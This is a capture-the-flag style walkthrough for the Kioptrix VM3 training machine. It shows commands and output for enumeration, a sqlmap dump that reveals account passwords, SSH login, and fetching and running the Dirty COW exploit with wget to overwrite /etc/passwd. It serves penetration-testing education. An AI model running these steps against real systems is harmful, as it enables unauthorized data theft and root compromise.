Kioptrix VM3 Walkthrough

Prerequisites:

1. Kioptrix VM3 image running on VMware.


2. Attacker machine (e.g., Kali Linux).


3. Basic knowledge of Linux and penetration testing tools.



1. Network Configuration and Target Information

Ensure that the Kioptrix VM3 and the attacking machine are on the same network. For this example, let's assume the target IP address of the Kioptrix VM3 is 192.168.48.149

To identify the target’s IP address in your network, run a network scan from your attacking machine using nmap:

nmap 192.168.48.1/24 -T4

This command scans the subnet 192.168.48.1/24 with a timing option -T4 for faster results.

Sample Output:

Nmap scan report for 192.168.48.149
Host is up (0.0031s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:FD:CB:95 (VMware)

From this output, we can see that the target IP 192.168.48.149 has SSH (port 22) and HTTP (port 80) open.

2. Bind Target IP to Domain Name

Next, bind the target’s IP address to a domain name in your /etc/hosts file to make it easier to reference:

sudo nano /etc/hosts

Add the following line to the file:

192.168.48.149 kioptrix3.com

Verify the changes:

cat /etc/hosts

The output should include:

127.0.0.1 localhost
127.0.1.1 kali
::1 localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
192.168.48.149 kioptrix3.com

3. Service Enumeration (Port Scanning)

Run a full service version scan on the target to identify running services:

nmap -sV 192.168.48.149

Sample Output:

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch

From this output, we know the target is running Apache on port 80 and OpenSSH on port 22.

4. Enumerating HTTP Services

Port 80 (HTTP) is open, so we access the web application by opening a browser and navigating to:

http://kioptrix3.com/

To further enumerate hidden directories, use Gobuster with a wordlist:

gobuster dir -u http://kioptrix3.com/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

Sample Output:

/modules (Status: 301)
/gallery (Status: 301)
/data (Status: 403)
/core (Status: 301)
/style (Status: 301)
/cache (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)

Here, directories like /modules, /gallery, and /phpmyadmin stand out as interesting targets.

5. Web Application Vulnerabilities

By using Nikto to scan the /gallery directory:

nikto -h http://kioptrix3.com/gallery

Sample Nikto Output:

/gallery/: The X-Content-Type-Options header is not set.
PHP/5.2.4-2ubuntu5.6 appears to be outdated.
Apache/2.2.8 appears to be outdated.
...
/gallery/db.sql: DATABASE SQL FOUND!

We have found a SQL database located in /gallery/db.sql.

6. SQL Injection Exploitation

Using the SQLmap tool, we exploit a SQL injection vulnerability found in the URL parameter id=1 of the /gallery.php page:

sqlmap --batch --banner -u http://kioptrix3.com/gallery/gallery.php?id=1 --dump

SQLmap Output:

[INFO] fetching current database
[INFO] fetching tables for database: 'gallery'
[INFO] retrieved: 'dev_accounts'
[INFO] fetched: 'dev_accounts' table entries

SQLmap successfully extracts data from the dev_accounts table, revealing usernames and password hashes:

+----+---------------------------------------------+------------+
| id | password                                   | username   |
+----+---------------------------------------------+------------+
| 1  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |
| 2  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |
+----+---------------------------------------------+------------+

We now have the username and password hash for both users.

7. Accessing SSH with Cracked Password

Using the extracted credentials, we try to log in via SSH with the username loneferret and password starwars:

ssh loneferret@192.168.48.149

If the connection fails due to an unsupported host key algorithm, use the following:

ssh loneferret@192.168.48.149 -oHostKeyAlgorithms=+ssh-rsa

Once logged in, we can explore the file system and check for privilege escalation opportunities.

8. Privilege Escalation

To elevate our privileges to root, first check the sudo privileges:

sudo -l

Output:

User loneferret may run the following commands on this host:
(root) NOPASSWD: !/usr/bin/su
(root) NOPASSWD: /usr/local/bin/ht

Since we have sudo access to /usr/local/bin/ht, we can execute this binary with root privileges.

Alternatively, we could look for SUID binaries or vulnerabilities like Dirty COW:

searchsploit linux/local/40839

Copy the exploit to your machine:

python3 -m http.server 8000
wget http://192.168.48.157:8000/40839.c

Compile and run the exploit:

gcc -pthread 40839.c -o dirty -lcrypt
./dirty /etc/passwd

This would allow us to overwrite the /etc/passwd file, granting us root access.


---

Note: The use of these tools should be restricted to authorized environments only, such as Capture the Flag (CTF) challenges, penetration testing with permission, or educational purposes. Always have explicit consent before testing systems.

